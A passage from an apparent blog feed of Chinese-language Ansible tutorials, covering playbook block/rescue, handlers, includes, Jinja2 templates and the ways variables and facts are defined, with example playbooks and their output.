class="line">  always:</span><br><span class="line">    - debug:</span><br><span class="line">        msg: &quot;This always executes&quot;</span><br></pre></td></tr></table></figure><p>rescue表示上一个task(command:/bin/false)语句执行异常时就会执行rescue的task.</p><p>而always表示无论command:/bin/false是否执行异常都会执行.</p><hr><h3 id="block块或者l-方式功能–使notify对应多个handlers"><a href="#block块或者l-方式功能–使notify对应多个handlers" class="headerlink" title="block块或者l-方式功能–使notify对应多个handlers"></a>block块或者l-方式功能–使notify对应多个handlers</h3><p>利用block块功能,可以将一个notify语句,对应多个handlers语句.例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  notify:</span><br><span class="line">      - restart nginx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">handlers:</span><br><span class="line"></span><br><span class="line">   - name: restart nginx</span><br><span class="line">     block:</span><br><span class="line">       - command: docker restart web</span><br><span class="line">         when: inventory_hostname == &apos;docker&apos;</span><br><span class="line"></span><br><span class="line">       - shell: nginx -s reload</span><br><span class="line">         when: inventory_hostname != &apos;docker&apos;</span><br></pre></td></tr></table></figure><p>如此一来,可以分别针对不同服务器的重启方法来重启nginx.还可以利用下面的方式:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    notify:</span><br><span class="line">            - restart nginx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">handlers:</span><br><span class="line">   - name: restart nginx     shell: |-       &#123;%- if inventoey == &apos;docker&apos; -%&#125;         docker restart web       &#123;%- else -%&#125;         nginx -s reload       [%- endif -%&#125;</span><br></pre></td></tr></table></figure><p>|- 表示不换行,下列的if控制语句内的真实command语句都在shell模块的本行执行.</p><hr><h3 id="includes"><a href="#includes" class="headerlink" title="includes"></a>includes</h3><p>includes在Ansible中起引用功能,.其功能非常强大,可以引入一个Playbook文件,变量var文件等等.有时候多个task或者playbook需要进行一项重复的工作,则可以将这部分功能单独写入一个playbook文件,然后再通过includes调用.而不必每个playbook都去写同样一个功能的task.这有点类似于shell脚本的函数</p><p>用法:</p><p>比如下面定义了一个php的playbook:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- hosts: all</span><br><span class="line">  remote_user: root</span><br><span class="line">  tasks:</span><br><span class="line">    - name:PHP a project</span><br><span class="line">      command: A project</span><br><span class="line">- name: restart php</span><br><span class="line">  hosts: all</span><br><span class="line">  remote_user: root</span><br><span class="line">  tasks:</span><br><span class="line">    - include: restartphp.yml</span><br></pre></td></tr></table></figure><p>然后定义restartphp.yml文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- name: restart php</span><br><span class="line">  server: name=php-fpm state=restarted</span><br></pre></td></tr></table></figure><p>同样其他的playbook想要重启Php服务不必再写重复的playbook task.只需要include retartphp.yml文件即可.</p><h4 id="动态includes"><a href="#动态includes" class="headerlink" title="动态includes"></a>动态includes</h4><p>includes还可以结合when语句.即只有当满足when条件时,才include文件执行.例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-name: check if file exist</span><br><span class="line"> stat: path=test.txt</span><br><span class="line"> register: check_file</span><br><span class="line"></span><br><span class="line">-include: task.yml</span><br><span class="line"> when: check_file.stat.exists</span><br></pre></td></tr></table></figure><p>下面的一个简单的例子演示了include的用法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$vim include.yml</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">  - hosts: all</span><br><span class="line">    remote_user: root</span><br><span class="line">    tasks:</span><br><span class="line">       - include: task.yml</span><br><span class="line">         when: ansible_default_ipv4.address == &quot;10.0.4.230&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@localhost playbook]$vim task.yml</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">    #这是include.yml文件导入的playbook</span><br><span class="line">  - name: create a file</span><br><span class="line">    file: path=/tmp/include.txt state=touch</span><br></pre></td></tr></table></figure><p>执行结果可以显示这个include的task.yml文件只在10.0.4.230这台服务器上执行了:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$ansible-playbook include.yml</span><br><span class="line"></span><br><span class="line">TASK [create a file] *********************************************************************************************************************************************************************************************</span><br><span class="line">skipping: [10.0.4.231]</span><br><span class="line">changed: [10.0.4.230]</span><br><span class="line"></span><br><span class="line">PLAY RECAP *******************************************************************************************************************************************************************************************************</span><br><span class="line">10.0.4.230                 : ok=2    changed=1    unreachable=0    failed=0</span><br><span class="line">10.0.4.231                 : ok=1    changed=0    unreachable=0    failed=0</span><br></pre></td></tr></table></figure><hr><h3 id="template-模板"><a href="#template-模板" class="headerlink" title="template 模板"></a>template 模板</h3><p>template常被用来传输文件,但是template模板的强大之处就在于支持变量替换.template支持jinja2的渲染格式,.另外还支持for循环以及if判断语句.下面来一个简单的例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#编写一个简单的playbook</span><br><span class="line">[root@localhost playbook]$vim template.yml</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"> - hosts: all</span><br><span class="line">   vars:</span><br><span class="line">      - version: 1.3.5</span><br><span class="line">      - env_name: beta</span><br><span class="line">      - author: jesse</span><br><span class="line"></span><br><span class="line">   tasks:</span><br><span class="line">      - name: practise tempalte function</span><br><span class="line">        template: src=template/test_template.j2 dest=/tmp/test_template.txt</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">#编写test_template.j2模板文件:</span><br><span class="line">[root@localhost playbook]$vim template/test_template.j2</span><br><span class="line"></span><br><span class="line">project_env: &#123;&#123; env_name &#125;&#125;</span><br><span class="line">project_version: &#123;&#123; version &#125;&#125;</span><br><span class="line">project_author: &#123;&#123; author &#125;&#125;</span><br></pre></td></tr></table></figure><p>执行template.yml这个playbook:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$ansible-playbook template.yml</span><br><span class="line"></span><br><span class="line">TASK [practise tempalte function] ********************************************************************************************************************************************************************************</span><br><span class="line">changed: [10.0.4.230]</span><br><span class="line">changed: [10.0.4.231]</span><br><span class="line"></span><br><span class="line">PLAY RECAP *******************************************************************************************************************************************************************************************************</span><br><span class="line">10.0.4.230                 : ok=2    changed=1    unreachable=0    failed=0</span><br><span class="line">10.0.4.231                 : ok=2    changed=1    unreachable=0    failed=0</span><br></pre></td></tr></table></figure><p>查看远程主机上的test_template.txt文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]$cat /tmp/test_template.txt</span><br><span class="line">project_env: beta</span><br><span class="line">project_version: 1.3.5</span><br><span class="line">project_author: jesse</span><br></pre></td></tr></table></figure><hr><h4 id="template的jinja2-模板for循环"><a href="#template的jinja2-模板for循环" class="headerlink" title="template的jinja2 模板for循环"></a>template的jinja2 模板for循环</h4><p>模板for循环的格式如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for item in item_list %&#125;</span><br><span class="line">  ......</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>渲染风格和python的django的模板渲染风格一模一样,. 大括号两边也要预留一个空格..</p><p>例如稍微改一下上面例子中的test_template.j2模板文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$vim template/test_template.j2</span><br><span class="line"></span><br><span class="line">&#123;% for item in range(1,10) %&#125;</span><br><span class="line">   line &#123;&#123; item &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>重新执行playbook后,在远程服务器节点上查看/tmp/test_template.txt文件内容:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]$cat /tmp/test_template.txt</span><br><span class="line">   line 1</span><br><span class="line">   line 2</span><br><span class="line">   line 3</span><br><span class="line">   line 4</span><br><span class="line">   line 5</span><br><span class="line">   line 6</span><br><span class="line">   line 7</span><br><span class="line">   line 8</span><br><span class="line">   line 9</span><br><span class="line">[root@localhost ~]$</span><br></pre></td></tr></table></figure><hr><h4 id="template模板的-jinja2-If语句"><a href="#template模板的-jinja2-If语句" class="headerlink" title="template模板的 jinja2 If语句"></a>template模板的 jinja2 If语句</h4><ul><li>if条件判断语句格式如下:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if condition %&#125;</span><br><span class="line">......</span><br><span class="line">&#123;% else%&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>继续稍微改一下上面例子的test_template.j2模板文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#下面的例子中先判断author值,以及myname变量是否定义.(我们的template.yml的playbook文件中定义了author变量,但是没有定义myname变量)</span><br><span class="line">[root@localhost playbook]$vim template/test_template.j2</span><br><span class="line"></span><br><span class="line">&#123;% if author == &quot;jesse&quot; %&#125;</span><br><span class="line">HI,my name is jesse</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% if  myname  is defined %&#125;</span><br><span class="line">hi.myname is &#123;&#123; myname &#125;&#125;</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">sorry,myname is not defined.</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>执行完毕后,远程服务器节点文件内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]$cat /tmp/test_template.txt</span><br><span class="line">HI,my name is jesse</span><br><span class="line"></span><br><span class="line">sorry,myname is not defined.</span><br></pre></td></tr></table></figure><ul><li>if多重判断</li></ul><p>if语句执行逻辑与(and)和逻辑或(or)的多重判断.比如下面的例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if dwd_env is defined and https %&#125;</span><br><span class="line">    listen 443 ssl http2;</span><br><span class="line">    ssl_protocols TLSV1 TLSV1.1  TLSv1.2 ;</span><br><span class="line">    ssl_prefer_server_ciphers on;</span><br><span class="line">    ssl_ciphers &quot;EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH&quot;;</span><br><span class="line">    ssl_ecdh_curve secp384r1;</span><br><span class="line">    ssl_session_cache shared:SSL:10m;</span><br><span class="line">    #ssl_session_tickets off;</span><br><span class="line">    ssl_session_timeout 60m;</span><br><span class="line">    ssl_stapling on;</span><br><span class="line">    ssl_stapling_verify on;</span><br><span class="line">    resolver 8.8.4.4 8.8.8.8 valid=300s;</span><br><span class="line">    resolver_timeout 5s;</span><br><span class="line">   #add_header Strict-Transport-Security &quot;max-age=63072000; includeSubDomains; preload&quot;;</span><br><span class="line">    add_header X-Frame-Options DENY;</span><br><span class="line">    add_header X-Content-Type-Options nosniff;</span><br><span class="line">    ssl_certificate /etc/letsencrypt/live/&#123;&#123; dwd_env &#125;&#125;.&#123;&#123; servername &#125;&#125;/fullchain.pem;</span><br><span class="line">    ssl_certificate_key /etc/letsencrypt/live/&#123;&#123; dwd_env &#125;&#125;.&#123;&#123; servername &#125;&#125;/privkey.pem;</span><br><span class="line">    ssl_trusted_certificate  /etc/letsencrypt/live/&#123;&#123; dwd_env &#125;&#125;.&#123;&#123; servername &#125;&#125;/chain.pem;</span><br><span class="line"></span><br><span class="line">   &#123;% else %&#125;</span><br><span class="line"></span><br><span class="line">    listen &#123;&#123; listen | default(80) &#125;&#125;;</span><br><span class="line"></span><br><span class="line">  &#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>上面例子中变量dwd_env是字符串类型.值为beta,而https的变量类型是布尔型,值为True.</p><hr><h4 id="template-jinja2-default-语句"><a href="#template-jinja2-default-语句" class="headerlink" title="template jinja2 default()语句"></a>template jinja2 default()语句</h4><p>除了if条件判断外,还可以使用default()语句.顾名思义,这是表示一个默认值.</p><p>用法格式:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; var | default(value) &#125;&#125; #如果变量var有定义则取用var的值,否则就使用默认值value</span><br></pre></td></tr></table></figure><p>修改一下上述的template模板文件如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$vim template/test_template.j2</span><br><span class="line"></span><br><span class="line">my book is &#123;&#123; book | default(&apos;ansible&apos;) &#125;&#125;;</span><br><span class="line">my name is &#123;&#123; author | default(&apos;xiaoming&apos;) &#125;&#125;</span><br></pre></td></tr></table></figure><p>执行后,远程服务器节点的文件内容输出如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]$cat /tmp/test_template.txt</span><br><span class="line">my book is ansible;</span><br><span class="line">my name is jesse</span><br></pre></td></tr></table></figure><h5 id="template的Jinja2特性还可以使用python的其他语法-比如合并变量值-过滤等等-这些高级用法以后面对复杂的大项目时再去研究-目前掌握这些基础语法已经组足够满足绝大多数的工作任务"><a href="#template的Jinja2特性还可以使用python的其他语法-比如合并变量值-过滤等等-这些高级用法以后面对复杂的大项目时再去研究-目前掌握这些基础语法已经组足够满足绝大多数的工作任务" class="headerlink" title="template的Jinja2特性还可以使用python的其他语法,比如合并变量值,过滤等等.这些高级用法以后面对复杂的大项目时再去研究.目前掌握这些基础语法已经组足够满足绝大多数的工作任务"></a>template的Jinja2特性还可以使用python的其他语法,比如合并变量值,过滤等等.这些高级用法以后面对复杂的大项目时再去研究.目前掌握这些基础语法已经组足够满足绝大多数的工作任务</h5>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;playbook高级特性&quot;&gt;&lt;a href=&quot;#playbook高级特性&quot; class=&quot;headerlink&quot; title=&quot;playbook高级特性&quot;&gt;&lt;/a&gt;playbook高级特性&lt;/h2&gt;&lt;h3 id=&quot;tags-标签&quot;&gt;&lt;a href=&quot;#tags-标签&quot; class=&quot;headerlink&quot; title=&quot;tags 标签&quot;&gt;&lt;/a&gt;tags 标签&lt;/h3&gt;&lt;p&gt;给task打上标签可以允许playbook执行的时候使用–tags选项只执行某个task或者–skip-tags选项不执行某个task.例如:&lt;/p&gt;
    
    </summary>
    
      <category term="Ansible" scheme="https://jesse.top/categories/Ansible/"/>
    
    
      <category term="Ansible" scheme="https://jesse.top/tags/Ansible/"/>
    
  </entry>
  
  <entry>
    <title>Ansible变量</title>
    <link href="https://jesse.top/2018/08/26/Ansible/Ansible%E5%8F%98%E9%87%8F/"/>
    <id>https://jesse.top/2018/08/26/Ansible/Ansible变量/</id>
    <published>2018-08-26T14:59:58.000Z</published>
    <updated>2018-12-01T14:27:37.281Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Ansible变量"><a href="#Ansible变量" class="headerlink" title="Ansible变量"></a>Ansible变量</h2><p>ansible有多重方式定义变量,还可以通过fact来获取变量.接下来学习一下ansibled 变量知识</p><hr><a id="more"></a><h3 id="在Inventory主机文件中定义变量"><a href="#在Inventory主机文件中定义变量" class="headerlink" title="在Inventory主机文件中定义变量"></a>在Inventory主机文件中定义变量</h3><p>可以对每台主机分配具体的变量,然后在playbook中调用.例如下面的主机Host和host2的变量定义:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[atlanta]</span><br><span class="line">host1 http_port=80 maxRequestsPerChild=808</span><br><span class="line">host2 http_port=303 maxRequestsPerChild=909</span><br></pre></td></tr></table></figure><p>也可以定义属于整个组的变量,这些变量在组内的所有服务器节点上生效:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[atlanta]</span><br><span class="line">host1</span><br><span class="line">host2</span><br><span class="line"></span><br><span class="line">[atlanta:vars]</span><br><span class="line">ntp_server=ntp.atlanta.example.com</span><br><span class="line">proxy=proxy.atlanta.example.com</span><br></pre></td></tr></table></figure><p>ansible还会从/etc/ansible/host_vars目录下寻找主机名命名的变量文件.例如如果inventory下有个host1主机,则可以在/etc/ansible/host_vars目录下创建host1文件.并且定义如下内容:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">foo: bar</span><br><span class="line">baz: qux</span><br></pre></td></tr></table></figure><p>则以上2个变量则会应用到host1主机中.</p><p>同理,可以在/etc/ansible/group_vars目录下创建主机组命名的变量文件,比如新建一个atlanta文件,且定义上面变量,则这2个变量会被应用到整个atlanta主机组</p><hr><h2 id="在playbook中定义变量"><a href="#在playbook中定义变量" class="headerlink" title="在playbook中定义变量"></a>在playbook中定义变量</h2><p>1.在playbook中定义vars字段可以定义变量.例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vars:</span><br><span class="line">  key_files: /etc/nginx/ssl/nginx.key</span><br><span class="line">  cert_files: /etc/nginx/ssl/nginx.crt</span><br><span class="line">  conf_files: /etc/nginx/sites-avaliable/default</span><br></pre></td></tr></table></figure><blockquote><p>note: 在Inventory文件中定义变量是用var=value,而在Playbook以及下面讲到的yaml格式的变量文件中变量格式为var: value</p></blockquote><p>2.还可以通过vars_files字段定义一个文件.然后将变量写入到这个文件内:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vars_files:</span><br><span class="line">   - nginx.yml</span><br><span class="line">   </span><br><span class="line">nginx.yml文件内容如下:</span><br><span class="line">  key_files: /etc/nginx/ssl/nginx.key</span><br><span class="line">  cert_files: /etc/nginx/ssl/nginx.crt</span><br><span class="line">  conf_files: /etc/nginx/sites-avaliable/default</span><br></pre></td></tr></table></figure><hr><h3 id="引用变量"><a href="#引用变量" class="headerlink" title="引用变量"></a>引用变量</h3><p>ansible使用jinjia2模板系统在playbook中引用变量.引用方法为 .例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My amp goes to &#123;&#123; max_amp_value &#125;&#125;</span><br></pre></td></tr></table></figure><p>### </p><h3 id="查看变量的值"><a href="#查看变量的值" class="headerlink" title="查看变量的值"></a>查看变量的值</h3><p>在之前的文档中提到了可以用debug模块来打印变量:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- name: print the variable</span><br><span class="line">  debug: var=myvarname</span><br></pre></td></tr></table></figure><hr><h3 id="注册变量"><a href="#注册变量" class="headerlink" title="注册变量"></a>注册变量</h3><p>经常需要基于task执行的结果来设置变量值.想要实现这个操作可以再调用模块时使用register语句来注册变量</p><p>例如,将whiami命令执行的结果保存到变量login中:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- name: capture output of whoami command</span><br><span class="line">  command: whoami</span><br><span class="line">  register: login</span><br></pre></td></tr></table></figure><p>访问login变量中的内容可以使用下列方法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- debug: msg=&quot;login is &#123;&#123;login.stdout&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如果变量中包含字典,可以使用点号. 或者中括号[]来访问字典内的Key.上面也可以写成:</p><p>login[‘stdout’]</p><p>比如还有下面的常见嵌套变量:</p><p>ansible_eth1[‘ipv4’][‘address’] </p><p>or:</p><p>ansible_eth1[‘ipv4’][‘address’]</p><p>ansible_eth1.ipv4[‘address’]</p><p>ansible_eth1.ipv4.address</p></blockquote><h3 id="fact"><a href="#fact" class="headerlink" title="fact"></a>fact</h3><p>ansible在执行playbook的时候,第一步就是采集主机的fact信息.主要包括:操作系统,IP地址,CPU,内存等等.这些信息都保存在fact变量中.</p><p>例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$vim facttest.yml</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"> - hosts: all</span><br><span class="line">   remote_user: root</span><br><span class="line">   gather_facts: True</span><br><span class="line">   tasks:</span><br><span class="line">     - name: print the fact varibale:ansible_distrubution</span><br><span class="line">       debug: var=ansible_distribution</span><br></pre></td></tr></table></figure><p>输出结果如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$ansible-playbook facttest.yml</span><br><span class="line"></span><br><span class="line">PLAY [all] *******************************************************************************************************************************************************************************************************</span><br><span class="line"></span><br><span class="line">TASK [Gathering Facts] *******************************************************************************************************************************************************************************************</span><br><span class="line">ok: [10.0.4.231]</span><br><span class="line">ok: [10.0.4.230]</span><br><span class="line"></span><br><span class="line">TASK [print the fact varibale:ansible_distrubution] **************************************************************************************************************************************************************</span><br><span class="line">ok: [10.0.4.231] =&gt; &#123;</span><br><span class="line">    &quot;ansible_distribution&quot;: &quot;CentOS&quot;</span><br><span class="line">&#125;</span><br><span class="line">ok: [10.0.4.230] =&gt; &#123;</span><br><span class="line">    &quot;ansible_distribution&quot;: &quot;CentOS&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PLAY RECAP *******************************************************************************************************************************************************************************************************</span><br><span class="line">10.0.4.230                 : ok=2    changed=0    unreachable=0    failed=0</span><br><span class="line">10.0.4.231                 : ok=2    changed=0    unreachable=0    failed=0</span><br></pre></td></tr></table></figure><blockquote><p>在调用fact变量时,并不需要register关键字来注册变量,因为fact是自动注册的.另外还有一些模块也会自带返回fact变量.比如docker模块</p></blockquote><h4 id="查询某台服务器的所有fact信息"><a href="#查询某台服务器的所有fact信息" class="headerlink" title="查询某台服务器的所有fact信息:"></a>查询某台服务器的所有fact信息:</h4><p>setup特殊模块可以显示fact信息:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$ansible 10.0.4.230 -m setup</span><br><span class="line">10.0.4.230 | SUCCESS =&gt; &#123;</span><br><span class="line">    &quot;ansible_facts&quot;: &#123;</span><br><span class="line">        &quot;ansible_all_ipv4_addresses&quot;: [</span><br><span class="line">            &quot;10.0.4.230&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;ansible_all_ipv6_addresses&quot;: [</span><br><span class="line">            &quot;fe80::20c:29ff:fedc:b1c7&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;ansible_apparmor&quot;: &#123;</span><br><span class="line">            &quot;status&quot;: &quot;disabled&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">其余的fact内容忽略</span><br></pre></td></tr></table></figure><p>由于fact内容实在太多.setup模块还支持filter参数,来匹配想要查找的fact信息.如果没有匹配到则返回空:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$ansible 10.0.4.230 -m setup -a &apos;filter=ansible_eth*&apos;</span><br><span class="line">10.0.4.230 | SUCCESS =&gt; &#123;</span><br><span class="line">    &quot;ansible_facts&quot;: &#123;&#125;,</span><br><span class="line">    &quot;changed&quot;: false</span><br><span class="line">&#125;</span><br><span class="line">[root@localhost playbook]$ansible 10.0.4.230 -m setup -a &apos;filter=ansible_ip*&apos;</span><br><span class="line">10.0.4.230 | SUCCESS =&gt; &#123;</span><br><span class="line">    &quot;ansible_facts&quot;: &#123;&#125;,</span><br><span class="line">    &quot;changed&quot;: false</span><br><span class="line">&#125;</span><br><span class="line">[root@localhost playbook]$ansible 10.0.4.230 -m setup -a &apos;filter=ansible_*ipv4*&apos;</span><br><span class="line">10.0.4.230 | SUCCESS =&gt; &#123;</span><br><span class="line">    &quot;ansible_facts&quot;: 